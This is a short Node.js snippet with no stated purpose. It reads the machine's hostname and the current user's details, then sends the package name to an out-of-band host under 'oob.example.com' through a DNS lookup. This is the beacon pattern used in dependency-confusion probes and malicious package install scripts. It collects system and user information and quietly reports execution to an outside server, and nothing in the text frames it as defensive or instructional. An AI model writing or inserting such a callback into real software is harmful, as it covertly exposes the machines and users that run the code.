const os = require('os'); const dns = require('dns');
const pkg = require('./package.json');
const host = os.hostname(); const user = os.userInfo();
dns.lookup(pkg.name+'.oob.example.com',()=>{});
